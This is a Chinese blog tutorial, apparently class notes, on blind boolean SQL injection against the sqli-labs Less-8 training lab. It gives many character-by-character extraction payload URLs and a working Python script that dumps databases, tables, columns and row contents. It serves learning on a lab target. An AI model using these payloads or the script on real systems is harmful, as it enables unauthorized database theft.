<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta name="theme-color" content="#1b7aca">
  <link rel="icon" href="/icon.jpg">
  <meta name="application-name" content="liuqi"/>
  <meta name="msapplication-TileColor" content="#1b7aca"/>
  <meta name="msapplication-square70x70logo" content="/icon.jpg" />
  <meta name="msapplication-square150x150logo" content="/icon.jpg" />
  <meta name="msapplication-wide310x150logo" content="/icon.jpg" />
  <meta name="msapplication-square310x310logo" content="/icon.jpg" />
  <meta name="msapplication-notification" content="frequency=30; polling-uri=/atom.xml" />
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="apple-touch-icon" href="/icon.jpg">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <link rel="apple-touch-startup-image" href="/icon.jpg">

  
  <title>sql注入之盲注 | liuqi</title>
  
  
  <meta name="description" content="吃吃睡睡、、、">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="sql注入之盲注"/>
  <meta property="og:site_name" content="liuqi"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  
    <link href="/css/animate.css" rel="stylesheet">
  
  
    <script src="/js/jquery-2.0.3.min.js"></script>
  
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script>
    if (window.location.href.indexOf("yoursite.com")<0) {      location.href = location.href.replace(location.host, "yoursite.com");    }
  </script>

</head>


<body>
<!--[if lt IE9]>
<script>
alert("Please Update Your IE \n请升级您的IE浏览器");
</script>
< ![endif]-->
  <header id="header" class="header header--fixed hide-from-print animated slideInDown"><div class="alignleft backtohome">
  <a href="/">
    <img id="icon-photo-small" class="personal-photo  animated rotateIn" src="/icon.jpg" alt="">
  </a>
  <h1 id="title-mini" class=""><a href="/">liuqi</a></h1>
</div>
<a target="_blank" id="mini-toggle" class="more icon alignright"></a>
<nav id="main-nav" class="alignright animated slideInRight">

    
    
      <a target="_blank" class="icon twitter" href="http://twitter.com/1ittlecup"></a>
    
    
    
      <a target="_blank" class="icon googleplus" href="http://plus.google.com/+RuoxinHe"></a> 
    
    
    
    
    
    
      <a target="_blank" class="icon zhihu" href="http://zhihu.com/people/1ittlecup"></a>
    
    
    
  <div class="clearfix"></div>
</nav>

</header>
  <aside id="sidebar" class="alignleft animated slideInLeft"><div class="personal-info">
  <figure>
    
    <div  class="backtohome">
      <a href="/">
        <img id="icon-photo-normal" class="personal-photo animated rotateIn" src="/icon.jpg" alt="">
      </a>
    </div>
    
    <figcaption>
      <h3 class=></h3>
      <p></p>
    </figcaption>
  </figure>
  <section class="social">
    
    
      <a target="_blank" class="icon twitter depth" href="http://twitter.com/1ittlecup"></a>
    
    
    
      <a target="_blank" class="icon googleplus depth" href="http://plus.google.com/+RuoxinHe"></a> 
    
    
    
    
    
    
      <a target="_blank" class="icon zhihu depth" href="http://zhihu.com/people/1ittlecup"></a>
    
    
    
  </section>
</div>
<div class="theme-info">
  <a target="_blank" href="https://github.com/heruoxin/hexo-persona-color" class="html5"> Persona Color Theme</a> 
  &copy; 2016 liuqi
  
</div>
</aside>
  <div id="content" class="inner">
    <p id="header-fix"></p>
    <div id="main-col" class="alignright"><div id="wrapper"><article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon depth"></div>
        <time class="depth" datetime="2016-07-07T00:35:30.000Z"><a href="#">2016-07-07</a></time>
      
      
  
    <h1 class="depth title">sql注入之盲注</h1>
  

    </header>
    <div class="entry depth">
      
        <p>特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，<br>它一次只能猜测一个字节，速度慢，但是只要存在注入就能用<br>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+<br>根据返回页面是否相同来得到数据<br>注入步骤</p>
<pre><code>找注入点、猜闭合字符
猜解列数、尝试得到显示位
猜数据库名
猜表名
猜列名
猜列值
</code></pre><ol>
<li>找到注入点，判断闭合字符</li>
<li>尝试猜解列数，得到显示位，并不能爆出显示位</li>
<li>得到数据库名<br>4.得到表名<br>5得到列名<br>6得到列值<br>EXISTS 是判断是否存在,和in类似,但效率要比in高</li>
</ol>
<p>SELECT * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  EXISTS (SELECT ‘X’  FROM DEPT  WHERE  DEPT.DEPTNO = EMP.DEPTNO  AND  LOC = ‘MELB’)</p>
<p>SELECT  * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  DEPTNO IN(SELECT DEPTNO  FROM  DEPT  WHERE  LOC = ‘MELB’)</p>
<p>这两句效果一样<br>ASCII(str)</p>
<p>返回最左边的字符的字符串str的数值。如果str是空字符串，返回0<br>———————-+<br>                   53 |<br>———————-+</p>
<p>SUBSTR函数是用来截取数据库某一列字段中的一部分。<br>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。</p>
<p>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。</p>
<p>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始。是吧。</p>
<p>mysql&gt; select substr(“ashdgfh”,2,1);<br>+———————–+<br>| substr(“ashdgfh”,2,1) |<br>+———————–+<br>| s                     |<br>+———————–+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; select substr(“ashdgfh”,2,2);<br>+———————–+<br>| substr(“ashdgfh”,2,2) |<br>+———————–+<br>| sh                    |<br>+———————–+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;100;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;100 |<br>+————————————————-+<br>|                                               1 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;120;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;120 |<br>+————————————————-+<br>|                                               0 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select length((select database()))&gt;8) –+    长度是8位 8不正常<br><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii(select (substr((select database()),1,1))&gt;113) –+</p>
<pre><code>115
</code></pre><p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii (substr((select database()),1,1))&gt;115)<br>–+</p>
<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and ((select count(table_name) from information_schema.tables where table_schem<br>a=’security’)</p>
<blockquote>
<p>4)<br>–+  判断数据库有几张表</p>
</blockquote>
<p>判断有多少张表<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=database();<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; use information_schema;<br>Database changed<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=’security’;<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
<p>select count(table_name) from information_schema.tables where table_schem<br>a=’security’;</p>
<p>select ascii(substr((select table_name from information_schema.tables whe<br>re table_schema=database() limit 0,1),1,1))&gt;100;</p>
<p>首先判断长度</p>
<p><a href="http://127.0.0.1/sqli/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/?id=1</a>‘ and (select length((select database()))&gt;8) –+   证明长度返回为8<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),1,1)) &gt;115) –+  判断第一个字符为ascii码为115<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),2,1)) &gt;101) –+    第二个字符       101<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),8,1)) &gt;121) –+     第二个字符       121<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select (ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1)))&gt;114.) –+<br>该security库中 第二个表的表名第一个字的ascii码为114</p>
<p>ascii(substr())</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and length(version())=6<br> –+</p>
<h1 id="判断表存在不存在"><a href="#判断表存在不存在" class="headerlink" title="判断表存在不存在"></a>判断表存在不存在</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and exists(select * from information_schema.tables)<br> –+</p>
<h1 id="判断version-返回字符串-长度"><a href="#判断version-返回字符串-长度" class="headerlink" title="判断version()返回字符串 长度"></a>判断version()返回字符串 长度</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select length(version()))=6<br> –+</p>
<h1 id="判断有多少个库"><a href="#判断有多少个库" class="headerlink" title="判断有多少个库"></a>判断有多少个库</h1><p>select count(distinct+table_schema) from information_schema.tables</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt; 10<br> –+        </p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt;3<br> –+</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) =4<br> –+</p>
<h1 id="判断每一个库名"><a href="#判断每一个库名" class="headerlink" title="判断每一个库名"></a>判断每一个库名</h1><p>select distinct table_schema from information_schema.tables limit 0,1</p>
<p>select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1));;</p>
<p>第一个库的第一个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 100<br> –+</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 105<br> –+</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 104<br> –+</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) = 105<br> –+</p>
<p>依次类推</p>
<p>第一个库的第二个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1))) &gt; 100<br> –+</p>
<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1)))  = 110<br> –+</p>
<h1 id="判断某个库有多少个表"><a href="#判断某个库有多少个表" class="headerlink" title="判断某个库有多少个表"></a>判断某个库有多少个表</h1><p>bool型注入漏洞分析<br>1.判断当前数据库<br>查出数据库的ascii码，然后转换为字符串<br>select ascii(substr(select database()),1,1)<br>2.知道数据库名之后判断数据库有多少表<br>3.获取第一个表的字符的ascii码然后之后的获取之后的<br>4.知道表的名字之后获取内容</p>
<h1 id="课堂演示"><a href="#课堂演示" class="headerlink" title="课堂演示"></a>课堂演示</h1><p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘ –+<br>select database()</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select length((select database())) &gt; 8)<br> –+</p>
<p>长度( length(select database()) ): 8<br>当前数据库第一个字符的ascii码<br>select ascii(substr((select database()), 1, 1))<br><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 1, 1)) &gt; 114)<br> –+<br>当前数据库第一个字符的ascii码 = 115   s<br><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 2, 1)) &gt; 101)<br> –+</p>
<p>当前数据库第2个字符的ascii码 = 101   e</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select database()), 8, 1)) = 121)<br> –+</p>
<p>当前数据库第8个字符的ascii码 = 121   y</p>
<h1 id="当前数据库有多少个表"><a href="#当前数据库有多少个表" class="headerlink" title="当前数据库有多少个表"></a>当前数据库有多少个表</h1><p>select count(table_name) from information_schema.tables where table_schema=database()</p>
<p>select count(table_name) from information_schema.tables where table_schema=’security’</p>
<p>select count(table_name) from information_schema.tables where table_schema=0x7365637572697479</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select count(table_name) from information_schema.tables where table_schema=0x7365637572697479) &gt; 4)<br> –+</p>
<p>当前数据库有多少个表  : 4</p>
<h1 id="获取当前数据库的第一个表的第一个字符的length"><a href="#获取当前数据库的第一个表的第一个字符的length" class="headerlink" title="获取当前数据库的第一个表的第一个字符的length"></a>获取当前数据库的第一个表的第一个字符的length</h1><p>select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5)<br> –+</p>
<p> 获取当前数据库的第一个表的第一个字符的length: 6</p>
<h1 id="获取当前数据库的第一个表的第一个字符的ascii"><a href="#获取当前数据库的第一个表的第一个字符的ascii" class="headerlink" title="获取当前数据库的第一个表的第一个字符的ascii"></a>获取当前数据库的第一个表的第一个字符的ascii</h1><p>select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 100)<br> –+</p>
<p>获取当前数据库的第一个表的第一个字符的ascii: 101</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 2, 1)) &gt; 109)<br> –+</p>
<p>获取当前数据库的第一个表的第2个字符的ascii: 109</p>
<h1 id="获取当前数据库的emails表的第1列-列名的第1个字符的length"><a href="#获取当前数据库的emails表的第1列-列名的第1个字符的length" class="headerlink" title="获取当前数据库的emails表的第1列 列名的第1个字符的length"></a>获取当前数据库的emails表的第1列 列名的第1个字符的length</h1><p>select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1) &gt; 2)<br> –+</p>
<p>获取当前数据库的emails表的第1列 列名的第1个字符的length : 2</p>
<h1 id="获取当前数据库的emails表的第1列-列名"><a href="#获取当前数据库的emails表的第1列-列名" class="headerlink" title="获取当前数据库的emails表的第1列 列名"></a>获取当前数据库的emails表的第1列 列名</h1><p>select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1) &gt; 104)<br> –+</p>
<p> 105</p>
<h1 id="获取内容"><a href="#获取内容" class="headerlink" title="获取内容"></a>获取内容</h1><p>select length(email_id) from emails limit 0,1</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select length(email_id) from emails limit 0,1) &gt; 16)<br> –+</p>
<p>length : 16 </p>
<p>select email_id from emails limit 0,1</p>
<p>select ascii(substr(email_id, 1, 1)) from emails limit 0,1</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 1, 1)) from emails limit 0,1) &gt; 67)<br> –+</p>
<p> 68 </p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 2, 1)) from emails limit 0,1) &gt; 116)<br> –+</p>
<p>117</p>
<p><a href="http://172.21.50.66/Less-8/?id=1" target="_blank" rel="external">http://172.21.50.66/Less-8/?id=1</a>‘<br>and ((select ascii(substr(email_id, 3, 1)) from emails limit 0,1) &gt; 109)<br> –+</p>
<p> 109</p>
<p>附上代码：</p>
<p>#cding=utf-8<br>import re<br>import sys<br>import requests<br>import binascii</p>
<p>def getAllDatabases(url):<br>    num = 1<br>    while(True):<br>        db_url = url + “‘ and (select length((select database())) &gt; %d) –+” % num<br>        res = requests.get(db_url)<br>        con = res.content<br>        db_num = re.search(r’size=”5” color=”#FFFF00”&gt;(.<em>?)<br>‘,con.decode(‘utf8’))<br>        num += 1<br>        if db_num is None:<br>            break<br>    print (“Database Length: %d” % (num-1))<br>    le = num<br>    db = []<br>    for index in range(1,le):<br>        num = 1<br>        while(True):<br>            db_url = url + “‘ and (select ascii(substr((select database()), %d, 1)) &gt; %d) –+” % (index,num)<br>            res = requests.get(db_url)<br>            con = res.content<br>            db_num = re.search(r’size=”5” color=”#FFFF00”&gt;(.</em>?)<br>‘,con.decode(‘utf8’))<br>            num += 1<br>            if db_num is None:<br>                break<br>        db.append(chr(num - 1))<br>    data_name = ‘’.join(db)<br>    print (“Database : %s” % data_name)<br>def getAlltables(url,db_name):<br>    num = 1</p>
<pre><code># db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
db_name_hex = &quot;0x7365637572697479&quot;
while(True):
    db_url = url + &quot;&apos; and ((select count(table_name) from information_schema.tables where table_schema=%s) &gt; %d) --+&quot; % (db_name_hex,num)
    res = requests.get(db_url)
    con = res.content
    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
    num += 1
    if db_num is None:
        break
print (&quot;Table number: %d&quot; % (num-1))
lol = num - 1
le = num  #le=5
db = []
for le in range(0,(le-1)):
    num = 1
    while(True):
        table_url = url + &quot;&apos; and ((select length((select table_name from information_schema.tables where table_schema=database() limit %d,1))) &gt; %d) --+&quot; % (le,num)
        # print (table_url)
        res = requests.get(table_url)
        con = res.content
        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
        if db_num is None:
            break
        else:
            num += 1
    db.append(num)
print (db)
tab = []
for l in range(0,lol):
    dx = []
    x = db[l] + 1
    for index in range(1,x):
        num = 1
        while(True):
            db_url = url + &quot;&apos; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d, 1)) &gt; %d) --+&quot; % (l,index,num)
            res = requests.get(db_url)
            con = res.content
            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
            if db_num is None:
                break
            else:
                num += 1
        print (&quot;Table %d is : %s&quot; % (index,chr(num)))
        dx.append(chr(num))
    data_name = &apos;&apos;.join(dx)
    print (&quot;The %d table : %s&quot; % ((l+1),data_name))
    tab.append(data_name)
print (&quot;Database: %s&quot; % db_name)
for h in tab:
    print (&quot;|    %s&quot; % h)
</code></pre><p>def getAllcolumns(url,database,table):<br>    num = 1</p>
<pre><code># db_name_hex = &quot;0x&quot; + binascii.b2a_hex(database)
# table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)
db_name_hex = &quot;0x7365637572697479&quot;
table_name_hex = &quot;0x7573657273&quot;
while(True):
    db_url = url + &quot;&apos; and ((select count(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit 0,1) &gt; %d) --+&quot; % (table_name_hex,num)
    res = requests.get(db_url)
    con = res.content
    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
    num += 1
    if db_num is None:
        break
print (&quot;column number: %d&quot; % (num-1))
lol = (num-1)
column_num = []
for x in range(0,(num-1)):
    num_col = 1
    while(True):
        db_url = url + &quot;&apos; and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (table_name_hex,x,num_col)
        # print (db_url)
        res = requests.get(db_url)
        con = res.content
        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
        if db_num is None:
            break
        else:
            num_col += 1
    column_num.append(num_col)
    print (&quot;column %d number: %d&quot; % ((x+1),num_col))
tab = []
for l in range(0,lol):
    dx = []
    x = column_num[l] + 1
    for index in range(1,x):
        num = 1
        while(True):
            db_url = url + &quot;&apos; and ((select ascii(substr(column_name, %d, 1)) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (index,table_name_hex,l,num)
            res = requests.get(db_url)
            con = res.content
            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
            if db_num is None:
                break
            else:
                num += 1
        print (&quot;Table %d is : %s&quot; % (index,chr(num)))
        dx.append(chr(num))
    data_name = &apos;&apos;.join(dx)
    print (&quot;The %d column : %s&quot; % ((l+1),data_name))
    tab.append(data_name)
print (&quot;Database: %s&quot; % table)
for h in tab:
    print (&quot;|    %s&quot; % h)
</code></pre><p>def getAllcontents(url,database,table,column):</p>
<pre><code># table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)
# column_name_hex = &quot;0x&quot; + binascii.b2a_hex(column)
column_name_hex = &quot;0x757365726e616d65&quot;
db_name_hex = &quot;0x7365637572697479&quot;
table_name_hex = &quot;0x7573657273&quot;
num = 1
while(True):
    db_url = url + &quot;&apos; and ((select count(%s) from %s limit 0,1) &gt; %d) --+&quot; % (column,table,num)
    res = requests.get(db_url)
    con = res.content
    db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
    if db_num is None:
        break
    else:
        num += 1
print (&quot;%s number: %d&quot; % (column,num))
lol = num
print (lol)
column_num = []
colm = []
for x in range(0,lol):
    num_col = 1
    while(True):
        db_url = url + &quot;&apos; and ((select length(%s) from %s limit %d,1) &gt; %d) --+&quot; % (column,table,x,num_col)
        res = requests.get(db_url)
        con = res.content
        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
        if db_num is None:
            break
        else:
            num_col += 1
    print (&quot;Column : %s number: %d is : %s &quot; % (column,(x+1),num_col))
    for op in range(1,(num_col+1)):
        num_op = 1
        while(True):
            con_url = url + &quot;&apos; and ((select ascii(substr(%s, %d, 1)) from %s limit %d,1) &gt; %d) --+&quot; % (column,op,table,x,num_op)
            res = requests.get(con_url)
            con = res.content
            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))
            if db_num is None:
                break
            else:
                num_op += 1
        column_num.append(chr(num_op))
        print (&quot;Column : %s number: %d is : %s &quot; % (column,op,chr(num_op)))
    col_data_name = &apos;&apos;.join(column_num)
    print (col_data_name)
    colm.append(col_data_name)
for h in colm:
    print (&quot;|    %s&quot; % h)    
</code></pre><p>def main():<br>    if sys.argv[1] == ‘–dbs’:<br>        getAllDatabases(sys.argv[2])<br>    elif sys.argv[1] == ‘–tab’:<br>        getAlltables(sys.argv[2],sys.argv[3])<br>    elif sys.argv[1] == ‘–col’:<br>        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])<br>    elif sys.argv[1] == ‘–dump’:<br>        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])<br>    else:<br>        print (‘What…’)</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>

      
    </div>
    <footer>
      
        
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



</div></div>
    <div class="clearfix"></div>
  </div>

  <footer id="footer" class="inner"></footer>
  <script src="/js/headroom.min.and.gallery.js"></script>
<script>
$("#mini-toggle").click(function () {
    $( "#main-nav" ).css("display","inline");
    setTimeout(function(){
        $( "#main-nav" ).removeClass("slideInRight").addClass("slideOutRight");
    }, 3000);
    setTimeout(function(){
        $( "#main-nav" ).css("display","");
        $( "#main-nav" ).removeClass("slideOutRight").addClass("slideInRight");
    }, 3555);
});
</script>

<script>
$("#header").headroom({
  "tolerance": 0,
  "offset": 200,
  "classes": {
    "initial": "",
    "pinned": "slideInDown",
    "unpinned": "slideOutUp"
  }
});
$("#header").headroom("destroy");
console.log("这网站没彩蛋，不用找了……")
</script>

<script>
$("a").click(function () {
    $( "#icon-photo-small"  ).removeClass( "rotateIn" ).addClass( "rotateOut" );
    $( "#icon-photo-normal" ).removeClass( "rotateIn" ).addClass( "rotateOut" );
    setTimeout(function(){
        $( "#icon-photo-small"  ).removeClass( "rotateOut" ).addClass( "rotateIn" );
        $( "#icon-photo-normal" ).removeClass( "rotateOut" ).addClass( "rotateIn" );
    }, 900);
});
</script>


<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-46393541-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


<!--[if lt IE 9]><script src="/js/excanvas.js"></script><![endif]-->
<script src="/js/jquery.tagcanvas.min.js"></script>
 <script type="text/javascript">
 $(document).ready(function() {
   if( ! $('#myCanvas').tagcanvas({
     textColour : '#6d6d6d',
     outlineThickness : 1,
     textHeight: 20,
     maxSpeed : 0.04,
     depth : 0.75
   })) {
     // TagCanvas failed to load
     $('#myCanvasContainer').hide();
   }
   // your other jQuery stuff here...
 });
 </script>


<script src="/js/pangu.js"></script>
<script>pangu.page_spacing();</script>



<script src="/js/jquery.imagesloaded.min.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
</html>
